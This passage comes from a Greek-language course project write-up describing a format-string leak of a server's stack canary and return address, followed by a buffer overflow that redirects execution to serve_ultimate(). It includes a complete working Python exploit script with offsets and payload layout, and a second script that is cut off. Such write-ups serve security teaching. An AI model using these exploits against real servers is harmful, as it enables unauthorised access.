   - Î Î·Î³Î±Î¯Î½Î¿Î½Ï„Î±Ï‚ ÏƒÏ„Î¿ Î¼Î·Ï‡Î¬Î½Î·Î¼Î± **linux02**, Î¼Î­ÏƒÏ‰ Ï„Î·Ï‚ ÎµÎ½Ï„Î¿Î»Î®Ï‚ `lscpu` Î²ÏÎ®ÎºÎ±Î¼Îµ ÏŒÏ„Î¹ Ï€ÏÏŒÎºÎµÎ¹Ï„Î±Î¹ Î³Î¹Î± ***Little Endian*** ÏƒÏÏƒÏ„Î·Î¼Î±.
   
     ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/16-System_Endian.png)
     
<br/>

4. ÎŸÎ¹ Ï€ÏÏÏ„ÎµÏ‚ ÏƒÎºÎ­ÏˆÎµÎ¹Ï‚, Î®Ï„Î±Î½ Î¼Îµ Ï„Î¿ BOF Î½Î± ÎºÎ¬Î½Î¿Ï…Î¼Îµ override Ï„Î¿ Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î¿ Ï„Î¿Ï… Ï€Î¯Î½Î±ÎºÎ± **admin_pwd[1]** ÎºÎ±Î¹ Î½Î± Î³ÏÎ¬ÏˆÎ¿Ï…Î¼Îµ Î¼Î­ÏƒÎ± Î­Î½Î±Î½ Î´Î¹ÎºÏŒ Î¼Î±Ï‚ ÎºÏ‰Î´Î¹ÎºÏŒ
   Ï„Î¿Î½ Î¿Ï€Î¿Î¯Î¿ ÎºÎ±Î¹ Î¸Î± ÎµÏ€Î­ÏƒÏ„ÏÎµÏ†Îµ Î· `post_param()` Î³Î¹Î± Î½Î± ÎºÎ±Ï„Î±Ï†Î­ÏÎ¿Ï…Î¼Îµ Î½Î± Ï€ÎµÏÎ¬ÏƒÎ¿Ï…Î¼Îµ Ï„Î¿Î½ Î­Î»ÎµÎ³Ï‡Î¿ Ï€Î¿Ï… Î­Ï‡ÎµÎ¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±.
   
   ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/17-Password_Checking.png)
<br/>

5. ÎˆÏ€ÎµÎ¹Ï„Î± ÎµÎ¯Î´Î±Î¼Îµ ÏŒÏ„Î¹ Î¼Ï€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± ÎºÎ¬Î½Î¿Ï…Î¼Îµ ÎºÎ¬Ï„Î¹ Ï€Î¹Î¿ ÎµÏÎºÎ¿Î»Î¿ ÏƒÏ„Î·Î½ Ï…Î»Î¿Ï€Î¿Î¯Î·ÏƒÎ·, ÏŒÏ€Ï‰Ï‚ Ï„Î¿ Î½Î± Î±Î»Î»Î¬Î¾Î¿Ï…Î¼Îµ Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· ÎµÏ€Î¹ÏƒÏ„ÏÎ¿Ï†Î®Ï‚ Ï„Î·Ï‚ `post_param()` ÎºÎ±Î¹ Î½Î± 
   Ï„Î·Î½ Ï€Î¬Î¼Îµ ÏƒÏ„Î¿ ÏƒÎ·Î¼ÎµÎ¯Î¿ Ï€Î¿Ï… ÎµÎ¼ÎµÎ¯Ï‚ Î¸Î­Î»Î¿Ï…Î¼Îµ. Î•Î½ Ï€ÏÎ¿ÎºÎµÎ¹Î¼Î­Î½Ï‰, Î½Î± ÎºÎ±Î»Î­ÏƒÎ¿Ï…Î¼Îµ Ï„Î·Î½ **`serve_ultimate()`** ÏÏƒÏ„Îµ Î½Î± Î¼Î±Ï‚ ÏƒÏ„ÎµÎ¯Î»ÎµÎ¹ Ï„Î¿ _ultimate.html_.
<br/>

6. Î£Ï„Î·Î½ Î±ÏÏ‡Î® Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎ±Î¼Îµ Î½Î± Î²ÏÎ¿ÏÎ¼Îµ Ï„ÏÏŒÏ€Î¿ Î½Î± Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎ¿Ï…Î¼Îµ Ï„Î± ***canaries***. \
   Î£ÎºÎµÏ†Ï„Î®ÎºÎ±Î¼Îµ ÏŒÏ„Î¹ ÏƒÏ„Î·Î½ Î­ÎºÎ´Î¿ÏƒÎ· gcc-5.4 Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½ Î³Î½Ï‰ÏƒÏ„Î¬ vulnerabilities Ï€Î¿Ï… Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Î¼Îµ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„Î¿ÏÎ¼Îµ. [<sup>\[8\]</sup>](#8--httpswwwcvedetailscomvulnerability-listvendor_id-72product_id-960version_id-219995gnu-gcc-54html) \
   Î’ÏÎ®ÎºÎ±Î¼Îµ ÏŒÏ„Î¹ ÏŒÎ½Ï„Ï‰Ï‚ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ Î­Î½Î± security vulnerability Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ Î¸Î± Î¼Î±Ï‚ ÎµÏ€Î­Ï„ÏÎµÏ€Îµ Î½Î± Ï€ÎµÏÎ¬ÏƒÎ¿Ï…Î¼Îµ Ï„Î¿Î½ Î­Î»ÎµÎ³Ï‡Î¿ Ï„Î¿Ï… stack guard canary.
   
   |![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/18-GCC_5.4_Security_Vulnerability.png)|
   |-|
<br/>

7. Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± ÏƒÎºÎµÏ†Ï„Î®ÎºÎ±Î¼Îµ Ï€Ï‰Ï‚ ÎµÏ†ÏŒÏƒÎ¿Î½ Î²ÏÎ¹ÏƒÎºÏŒÎ¼Î±ÏƒÏ„Îµ ÏƒÎµ **x32** Î±ÏÏ‡Î¹Ï„ÎµÎºÏ„Î¿Î½Î¹ÎºÎ® Ï„ÏŒÏ„Îµ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Î¼Îµ Î½Î± ÎºÎ¬Î½Î¿Ï…Î¼Îµ _brute force_ ÏÏƒÏ„Îµ Î½Î± Î²ÏÎ¿ÏÎ¼Îµ Ï„Î·Î½ Ï„Î¹Î¼Î® 
   Ï„Î¿Ï… ÎºÎ±Î¹ Î½Î± Ï„Î·Î½ ÎµÏ€Î±Î½Î±Ï†Î­ÏÎ¿Ï…Î¼Îµ Î¼Î­ÏƒÏ‰ Ï„Î¿Ï… BOF Î³Î¹Î± Î½Î± Î¼Î·Î½ Ï€ÏÎ¿ÎºÏÏˆÎµÎ¹ ***stack smashing***, ÎºÎ¬Ï„Î¹ Ï€Î¿Ï… ÎµÎ½Î¹ÏƒÏ‡ÏÎµÏ„Î±Î¹ Î´ÎµÎ´Î¿Î¼Î­Î½Î¿Ï… ÏŒÏ„Î¹ Î­Ï‡Î¿Ï…Î¼Îµ Î½Î± ÎºÎ¬Î½Î¿Ï…Î¼Îµ Î¼Îµ 
   **Termiantor Canaries** (eg. 0xYYYYYY**00**), Ï€Î¿Ï… ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ ÏŒÏ„Î¹ Î¼ÎµÎ¹ÏÎ½ÎµÏ„Î±Î¹ Î±ÎºÏŒÎ¼Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ¿ Î¿ Ï‡ÏÏÎ¿Ï‚ Î±Î½Î±Î¶Î®Ï„Î·ÏƒÎ·Ï‚ Ï„Î¿Ï… _brute forcing_ [<sup>\[9\]</sup>](#9--httpsctf101orgbinary-exploitationstack-canariesbruteforcing-a-stack-canary)
   
   ÎˆÏ„ÏƒÎ¹ ÎºÎ¬Î½Î¿Î½Ï„Î±Ï‚ brute force byte per byte, Î¸Î± Ï‡ÏÎµÎ¹Î±Î¶ÏŒÎ¼Î±ÏƒÏ„Î±Î½ Ï„Î¿ Ï€Î¿Î»Ï 3\*255 = **765** Ï€ÏÎ¿ÏƒÏ€Î¬Î¸ÎµÎ¹Ï‚, ÎºÎ¬Ï„Î¹ Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ Î±Ï€Î¿Î´ÎµÎºÏ„ÏŒ Î³Î¹Î± Î­Î½Î± Ï„Î­Ï„Î¿Î¹Î¿ attack.
<br/>

8. Î©ÏƒÏ„ÏŒÏƒÎ¿, Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½ ÎºÎ±Î¹ Î¬Î»Î»Î¿Î¹ Ï€Î¹Î¿ ÎµÏÎºÎ¿Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Î³Î¹Î± Î½Î± ÎµÏ€Î¹Ï„ÎµÏ…Ï‡Î¸ÎµÎ¯ Ï„Î¿ Ï€Î±ÏÏŒÎ½ attack ÎºÎ±Î¹ Î³Î¹'Î±Ï…Ï„ÏŒ ÏƒÏ…Î½ÎµÏ‡Î¯ÏƒÎ±Î¼Îµ Ï‡Ï‰ÏÎ¯Ï‚ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„Î¿ÏÎ¼Îµ Ï„Î¿ Ï€Î±ÏÎ±Ï€Î¬Î½Ï‰ ÎºÎµÎ½ÏŒ 
   Î® ÎºÎ¬Î½Î¿Î½Ï„Î±Ï‚ brute force.
   
   ÎœÎ­ÏƒÏ‰ Ï„Î¿Ï… gdb ÎºÎ±Î¹ Î¼ÎµÏ„Î¬ Î±Ï€ÏŒ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ® Î±Î½Î±Î¶Î®Ï„Î·ÏƒÎ·, Î²ÏÎ®ÎºÎ±Î¼Îµ ÏŒÏ„Î¹ Ï„Î± ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î± canaries ÎµÎ¯Î½Î±Î¹ **Random Terminator Canaries** ÎºÎ±Î¹ Î­Ï„ÏƒÎ¹ ÎºÎ±Ï„Î±Î»Î¬Î²Î±Î¼Îµ Ï„Î¿
   Ï€Ï‰Ï‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¿ÏÎ½ ÎºÎ±Î¹ Ï€Ï‰Ï‚ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Î¼Îµ Î½Î± Ï„Î± ÎºÎ¬Î½Î¿Ï…Î¼Îµ bypass. [<sup>\[10\]</sup>](#10--httpsenwikipediaorgwikiBuffer_overflow_protectioncanaries)[<sup>\[11\]</sup>](#11--httpswwwusenixorglegacypublicationslibraryproceedingssec98full_paperscowancowanpdf)[<sup>\[12\]</sup>](#12--httpstaffustceducnbjhuacoursessecurity2014readingsstackguard-bypasspdf)[<sup>\[13\]</sup>](#13--httpsuafioexploitation20150929Stack-CANARY-Overwrite-Primerhtml)[<sup>\[14\]</sup>](#14--httpswwwblackhatcompresentationsbh-usa-04bh-us-04-silbermanbh-us-04-silberman-paperpdfpage6)

   Î’ÏÎ®ÎºÎ±Î¼Îµ Î´Î·Î»Î±Î´Î® ÏŒÏ„Î¹ Ï€Î±ÏÎ¬Î³Î¿Î½Ï„Î±Î¹ ÎºÎ±Ï„Î¬ Ï„Î¿ initialization Ï„Î¿Ï… server ÎºÎ±Î¹ Ï€Î±ÏÎ±Î¼Î­Î½ÎµÎ¹ Î¯Î´Î¹Î¿ Î³Î¹Î± ÎºÎ¬Î¸Îµ ÎºÎ»Î®ÏƒÎ· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚ Ï€Î¿Ï… Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ ÎºÎ¬Ï€Î¿Î¹Î¿Î½ Ï€Î¯Î½Î±ÎºÎ±.

   ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/19-Random_Terminator_Canaries.png)

   Î‘Ï…Ï„ÏŒ Î¬Î¼ÎµÏƒÎ± Î´Î·Î»ÏÎ½ÎµÎ¹ ÏŒÏ„Î¹ Î¼Ï€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± ÎºÎ¬Î½Î¿Ï…Î¼Îµ leak Ï„Î·Î½ Ï„Î¹Î¼Î® Ï„Î¿Ï… canary Ï„Î·Ï‚ **`check_auth()`** Î¼Î­ÏƒÏ‰ Ï„Î¿Ï… **FSA** Ï€Î¿Ï… Î¼Ï€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± ÎºÎ¬Î½Î¿Ï…Î¼Îµ ÎµÎºÎµÎ¯ ÎºÎ±Î¹ Î½Î± Ï„Î¿ 
   Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎ¿Ï…Î¼Îµ Î³Î¹Î± Î½Î± "ÎµÏ€Î±Î½Î±Ï†Î­ÏÎ¿Ï…Î¼Îµ" Ï„Î·Î½ Ï„Î¹Î¼Î® Ï„Î¿Ï… canary Ï„Î·Ï‚ **`post_param()`**.

   ÎˆÏ„ÏƒÎ¹, Î´Î¹Î±Î²Î¬Î¶Î¿Î½Ï„Î±Ï‚ Ï„Î·Î½ assembly Î¼Î­ÏƒÏ‰ Ï„Î¿Ï… gdb Î²ÏÎ®ÎºÎ±Î¼Îµ ÏŒÏ„Î¹ Ï„Î¿ canary Î±Ï€Î¿Î¸Î·ÎºÎµÏÎµÏ„Î±Î¹ ÏƒÏ„Î· Î¸Î­ÏƒÎ· **$ebp - 0xC**. 

   ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/20-Stored_Canary.png)

   Î“Î¹'Î±Ï…Ï„ÏŒ Î­Ï€ÏÎµÏ€Îµ Î½Î± Ï…Ï€Î¿Î»Î¿Î³Î¯ÏƒÎ¿Ï…Î¼Îµ Ï„Î¿ **offset** Î±Ï€ÏŒ Ï„Î· Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î® ***auth_username*** Î· Î¿Ï€Î¿Î¯Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î³Î¹Î± Ï„Î¿ **FSA**. \
   Î‘ÏÏ‡Î¹ÎºÎ¬, Î²ÏÎ®ÎºÎ±Î¼Îµ Ï„Î¿ offset Î¼ÎµÏ„Î±Î¾Ï Ï„Î¿Ï… **Î¿ÏÎ¯ÏƒÎ¼Î±Ï„Î¿Ï‚** Ï„Î·Ï‚ `printf()` ÎºÎ±Î¹ Ï„Î¿Ï… **ebp** Ï„Î·Ï‚ `check_auth()`, Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ Î¯ÏƒÎ¿ Î¼Îµ: **0x78 = 30\*4 = 120 bytes**. \
   Î‘ÏÎ±, Î¾Î­ÏÎ±Î¼Îµ Î¬Î¼ÎµÏƒÎ± ÏŒÏ„Î¹ Ï„Î¿ canary Î²ÏÎ¯ÏƒÎºÎµÏ„Î±Î¹ **0xC** bytes Ï€Î¹Î¿ Ï‡Î±Î¼Î·Î»Î¬ Î±Ï€ÏŒ Ï„Î¿Î½ ebp, Î±ÏÎ± ÎµÎ¯Ï‡Î±Î¼Îµ Ï„Î¿ offset Î¯ÏƒÎ¿ Î¼Îµ: **0x6C = 27\*4 = 108 bytes**.

   ÎˆÏ„ÏƒÎ¹, ÎºÎ¬Î½Î¿Î½Ï„Î±Ï‚ Î±ÏÏ‡Î¹ÎºÎ¬ Î­Î½Î± request Î¿Ï€Ï‰Ï‚ Î±Ï…Ï„ÏŒ Ï„Î¿Ï… Part_2 Î¼Îµ payload: **%27$x** Ï€Î±Î¯ÏÎ½Î¿Ï…Î¼Îµ Ï„Î·Î½ Ï„Î¹Î¼Î® Ï„Î¿Ï… canary!

   ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/21-Canary_Value.png)

<br/>

9. Î•Ï€ÎµÎ¹Ï„Î±, Ï…Ï€Î¿Î»Î¿Î³Î¯ÏƒÎ±Î¼Îµ Ï„Î¿ offset Ï„Î·Ï‚ Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ·Ï‚ Ï„Î·Ï‚ ÎµÎ½Ï„Î¿Î»Î®Ï‚ Ï€Î¿Ï… ÎºÎ±Î»ÎµÎ¯ Ï„Î·Î½ **`serve_ultimate()`** Î±Ï€ÏŒ Ï„Î·Î½ Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÎ® _return address_ Ï„Î·Ï‚ `check_auth()`, 
   Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ ÎµÎ¯Î½Î±Î¹ Î¯ÏƒÎ¿ Î¼Îµ: **0x145**. _(Î Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Ï€Î±ÏÎ±Ï„Î¯Î¸ÎµÏ„Î±Î¹ ÎºÎ±Î¹ Î¿ ÏƒÏ‡ÎµÏ„Î¹ÎºÏŒÏ‚ ÎºÏÎ´Î¹ÎºÎ±Ï‚ Ï€Î¿Ï… ÎºÎ¬Î½ÎµÎ¹ Ï„Î¿ attack)_
   
   |![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/22-Check_Auth_Ret.png)|![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/23-Call_Serve_Ultimate.png)|
   |-|-|
   
   Î£Ï„Î·Î½ Î±ÏÏ‡Î® Ï€Î·Î³Î±Î¯Î½Î±Î¼Îµ ÏƒÏ„Î¿ Tor ÎºÎ±Î¹ Ï€Î±Î¯ÏÎ½Î±Î¼Îµ Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± Ï€Î¿Ï… Ï‡ÏÎµÎ¹Î±Î¶ÏŒÎ¼Î±ÏƒÏ„Î±Î½ Î¼Î­ÏƒÏ‰ Ï„Î¿Ï… **FSA**, Î­Ï€ÎµÎ¹Ï„Î± Ï†Ï„Î¹Î¬Ï‡Î½Î±Î¼Îµ Ï„Î¿ payload ÏƒÎµ binary Î¼Î¿ÏÏ†Î®, Ï„Î¿ Î±Ï€Î¿Î¸Î·ÎºÎµÏÎ±Î¼Îµ 
   ÏƒÎµ Î±ÏÏ‡ÎµÎ¯Î¿ ÎºÎ±Î¹ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÏƒÎ±Î¼Îµ Ï„Î¿ **Postman** Î³Î¹Î± Î½Î± ÎºÎ¬Î½Î¿Ï…Î¼Îµ Ï„Î¿ request, Î±Î»Î»Î¬ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î±Ï…Ï„Î¿Î¼Î±Ï„Î¿Ï€Î¿Î¹Î®ÏƒÎ±Î¼Îµ ÏŒÎ»Î· Ï„Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± Ï†Ï„Î¹Î¬Ï‡Î½Î¿Î½Ï„Î±Ï‚ Î­Î½Î± python script.
   
   ```python
   ...
   binary_payload = BytesIO()
   binary_payload.write(("p" * 100).encode("utf-8"))
   binary_payload.write(canary)
   binary_payload.write(("p" * 8).encode("utf-8"))
   binary_payload.write(svd_ebp)
   binary_payload.write(srv_ulti)
   ...
   ```
   
   <details>
   <summary><b>Click here to see the full script</b></summary>
      <p>

      ```python
      import struct
      import base64
      import requests

      from sys import argv
      from io  import BytesIO

      # Sending 1st payload to / for getting the canary value and
      # the return address of check_auth() from reposnse headers
      url = 'http://localhost:' + argv[1] + '/'

      username_payload64 = base64.b64encode(bytes('%27$x %30$x %31$x', 'utf-8'))
      input_headers = {'Authorization': 'Basic ' + username_payload64.decode('UTF-8')}
      response = requests.request("GET", url, headers=input_headers)
      text_obj = list(response.headers.items())[0][1].split('user: ')[-1].replace('"' , '').split()

      # Building the payload
      canary   = text_obj[-3]
      ebp      = text_obj[-2]
      ret_addr = text_obj[-1]

      offset_srv_ulti = 0x145

      canary   = struct.pack('<L', int(canary  , base=16))
      svd_ebp  = struct.pack('<L', int(ebp     , base=16))
      srv_ulti = struct.pack('<L', int(ret_addr, base=16) + offset_srv_ulti)

      binary_payload = BytesIO()
      binary_payload.write(("p" * 100).encode("utf-8"))
      binary_payload.write(canary)
      binary_payload.write(("p" * 8).encode("utf-8"))
      binary_payload.write(svd_ebp)
      binary_payload.write(srv_ulti)

      # Sending the final request that will do the Buffer Overflow and retrieve ultimate.html
      url = 'http://localhost:' + argv[1] + '/ultimate.html'
      authentication64 = base64.b64encode(bytes('admin:you shall not pass', 'utf-8'))
      headers = {'Authorization': 'Basic ' + authentication64.decode('UTF-8')}
      response = requests.request("POST", url, headers=headers, data=binary_payload.getvalue(), timeout=None)

      print(response.text)
      
      # ------------------------------------------------------
      # Run: python3 bof.py <port>
      # eg.: python3 bof.py 8000
      ```

      </p>
   </details>
<br/>

10. Î©ÏƒÏ„ÏŒÏƒÎ¿, Ï€Î±ÏÎ±Ï„Î·ÏÎ®ÏƒÎ±Î¼Îµ ÏŒÏ„Î¹ ÎºÎ±Î¸Ï…ÏƒÏ„ÎµÏÎµÎ¯ Ï…Ï€ÎµÏÎ²Î¿Î»Î¹ÎºÎ¬ Î½Î± ÏƒÏ„ÎµÎ¯Î»ÎµÎ¹ Ï„Î·Î½ Î±Ï€Î¬Î½Ï„Î·ÏƒÎ· ÎºÎ±Î¹ Ï„ÏÎ­Ï‡Î¿Î½Ï„Î±Ï‚ Ï„Î¿ Ï„Î¿Ï€Î¹ÎºÎ¬, ÎµÎ¯Î´Î±Î¼Îµ ÏŒÏ„Î¹ Î±Î»Î»Î¬Î¶Î¿Î½Ï„Î±Ï‚ Î±Ï€Î»Î¬ Ï„Î¿ return 
    address Ï„Î·Ï‚ `check_auth()` ÏÏƒÏ„Îµ Î½Î± Ï€Î¬ÎµÎ¹ ÎºÎ±Ï„ÎµÏ…Î¸ÎµÎ¯Î±Î½ ÏƒÏ„Î·Î½ **ÎºÎ»Î®ÏƒÎ·** Ï„Î·Ï‚ **`serve_ultimate()`**, Ï„ÏŒÏ„Îµ Ï€ÏÎ¿ÎºÏÏ€Ï„ÎµÎ¹ **SIGSEGV**, Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ Î¿Ï†ÎµÎ¯Î»ÎµÏ„Î±Î¹ 
    ÏƒÏ„Î¿ ÏŒÏ„Î¹ Î· `serve_ultimate()` ÎµÏ€Î¹ÏƒÏ„ÏÎ­Ï†ÎµÎ¹ ÎºÎ±Î½Î¿Î½Î¹ÎºÎ¬ ÏƒÏ„Î·Î½ **`route()`** ÎºÎ±Î¹ ÏŒÏ„Î±Î½ Ï†Ï„Î¬Î½ÎµÎ¹ ÏƒÏ„Î· Î³ÏÎ±Î¼Î¼Î® main.c:**63** ÏŒÏ€Î¿Ï… Î³Î¯Î½ÎµÏ„Î±Î¹ Ï„Î¿ **`free()`**, 
    Ï„Î¿ ÏŒÏÎ¹ÏƒÎ¼Î± Ï„Î·Ï‚ (**given_pwd**) Ï€Î¿Ï… Î¸Î± Î±ÏÏ‡Î¹ÎºÎ¿Ï€Î¿Î¹Î¿ÏÎ½Ï„Î±Î½ Î±Î¼Î­ÏƒÏ‰Ï‚ Î¼ÎµÏ„Î¬ Ï„Î·Î½ ÎºÎ±Î½Î¿Î½Î¹ÎºÎ® ÎµÏ€Î¹ÏƒÏ„ÏÎ¿Ï†Î® Ï„Î·Ï‚ `post_param()`, Î´ÎµÎ½ Î­Ï‡ÎµÎ¹ Ï„ÎµÎ»Î¹ÎºÎ¬ Î±ÏÏ‡Î¹ÎºÎ¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ ÎºÎ±Î¹ Î­Ï„ÏƒÎ¹
    Î­Ï‡Î¿Î½Ï„Î±Ï‚ Î¼Î¹Î± Ï„Ï…Ï‡Î±Î¯Î± Ï„Î¹Î¼Î® Ï€ÏÎ¿ÎºÏÏ€Ï„ÎµÎ¹ Ï„Î¿ ***segmentation fault***.
    
    ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/24-Serve_Ultimate_SIGSEGV.png)
    
    ÎšÎ¬Î½Î¿Î½Ï„Î±Ï‚ kill Ï„Î¿ process Ï€Î¿Ï… ÎµÎ¾Ï…Ï€Î·ÏÎµÏ„Î¿ÏÏƒÎµ Ï„Î¿ Ï„ÏÎ­Ï‡Î¿Î½ request, ÏƒÏ„Î­Î»Î½ÎµÏ„Î±Î¹ Ï„Î¿ Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î¿ Ï„Î¿Ï… _ultimate.html_, ÎºÎ¬Ï„Î¹ Ï€Î¿Ï… ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ ÏŒÏ„Î¹ Î­Ï‡Î¿Ï…Î½ ÏƒÏ„Î±Î»ÎµÎ¯ 
    Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± ÏƒÏ„Î¿ pipeline, Î±Î»Î»Î¬ Î´ÎµÎ½ Î­Ï‡ÎµÎ¹ Î³Î¯Î½ÎµÎ¹ flush Î¿ buffer Ï„Î¿Ï… stdout ÎºÎ±Î¹ Î³Î¹'Î±Ï…Ï„ÏŒ Î´ÎµÎ½ Î­ÏÏ‡Î¿Î½Ï„Î±Î¹ Î¬Î¼ÎµÏƒÎ± Î¿Î¹ Î±Ï€Î±Î½Ï„Î®ÏƒÎµÎ¹Ï‚.    
<br/>

11. ÎˆÏ„ÏƒÎ¹, Î²ÏÎ®ÎºÎ±Î¼Îµ Î­Î½Î±Î½ ÎµÎ½Î±Î»Î»Î±ÎºÏ„Î¹ÎºÏŒ Ï„ÏÏŒÏ€Î¿ Î½Î± Ï€Î¬ÏÎ¿Ï…Î¼Îµ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ Ï‡Ï‰ÏÎ¯Ï‚ Î½Î± Ï‡Î±Î»Î¬ÏƒÎµÎ¹ Î· ÏÎ¿Î® Ï„Î·Ï‚ Ï…Ï€ÏŒÎ»Î¿Î¹Ï€Î·Ï‚ ÎµÎºÏ„Î­Î»ÎµÏƒÎ·Ï‚. 

    Î¥Ï€Î¿Î»Î¿Î³Î¯ÏƒÎ±Î¼Îµ Î½Î­Î± offsets Î¼ÎµÏ„Î±Î¾Ï Ï„Î·Ï‚ Ï€ÏÏÏ„Î·Ï‚ ÎµÎ½Ï„Î¿Î»Î®Ï‚ Ï„Î·Ï‚ **`serve_ultimate()`** ÎºÎ±Î¹ Ï„Î·Ï‚ Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÎ®Ï‚ return address Ï„Î·Ï‚ `check_auth()` Î­Ï„ÏƒÎ¹ ÏÏƒÏ„Îµ 
    Î½Î± Î¼Ï€Î¿ÏÎ­ÏƒÎ¿Ï…Î¼Îµ Î½Î± ÎµÎ»Î­Î³Î¾Î¿Ï…Î¼Îµ ÎºÎ±Î¹ Ï„Î¿ Ï€Î¿Ï… Î¸Î± ÎµÏ€Î¹ÏƒÏ„ÏÎ­ÏˆÎµÎ¹ Î· `serve_ultimate()` Î¼ÏŒÎ»Î¹Ï‚ Î¿Î»Î¿ÎºÎ»Î·ÏÏ‰Î¸ÎµÎ¯, ÎºÎ¬Ï„Î¹ Ï€Î¿Ï… Î´Îµ Î³Î¯Î½ÎµÏ„Î±Î¹ Î±Î½ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎ¿Ï…Î¼Îµ Ï„Î·Î½ ÎºÎ»Î®ÏƒÎ· 
    Ï„Î·Ï‚ ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚ Î¼Î­ÏƒÏ‰ Ï„Î·Ï‚ ÎµÎ½Ï„Î¿Î»Î®Ï‚ `call`, Î³Î¹Î±Ï„Î¯ Î· ÎµÎ½Ï„Î¿Î»Î® Î±Ï…Ï„Î® ÎºÎ¬Î½ÎµÎ¹ push Ï„Î¿ Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÏŒ return address Ï„Î·Ï‚ ÎµÎºÎ¬ÏƒÏ„Î¿Ï„Îµ ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚ Ï€Î¿Ï… ÎºÎ±Î»ÎµÎ¯, ÎºÎ¬Ï„Î¹ 
    Ï€Î¿Ï… Î´ÎµÎ½ Î¼Ï€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± Î±Î»Î»Î¬Î¾Î¿Ï…Î¼Îµ, ÎµÏ†ÏŒÏƒÎ¿Î½ Î³Î¯Î½ÎµÏ„Î±Î¹ ÏƒÎµ Î¼ÎµÏ„Î±Î³ÎµÎ½Î­ÏƒÏ„ÎµÏÎ¿ Ï‡ÏÏŒÎ½Î¿ Î±Ï€ÏŒ Ï„Î¿ BOF.
 
    |Description|Offset <br/> <sub>(from **check_auth** ret addr)</sub>|
    |-|-|
    |1Î· ÎµÎ½Ï„Î¿Î»Î® Ï„Î·Ï‚ `serve_ultimate()` | **0x870** |
    |Î•Ï€Î¹ÏƒÏ„ÏÎ¿Ï†Î® Ï„Î·Ï‚ `serve_ultimate()` Ï€Î±ÏÎ±ÎºÎ¬Î¼Ï€Ï„Î¿Î½Ï„Î±Ï‚ Ï„Î·Î½ `free()` | **0x169**|
    
    ```python
    ...
    binary_payload = BytesIO()
    binary_payload.write(("p" * 100).encode("utf-8"))
    binary_payload.write(canary)
    binary_payload.write(("p" * 8).encode("utf-8"))
    binary_payload.write(svd_ebp)
    binary_payload.write(srv_ulti)
    binary_payload.write(safe_ret)
    ...
    ```
    <details>
    <summary><b>Click here to see the full script</b></summary>
       <p>

       ```python
       import pycurl
       import struct
       import base64
       import requests
 
       from sys import argv
       from io  import BytesIO
 
       # Sending 1st payload to / for getting the canary value and
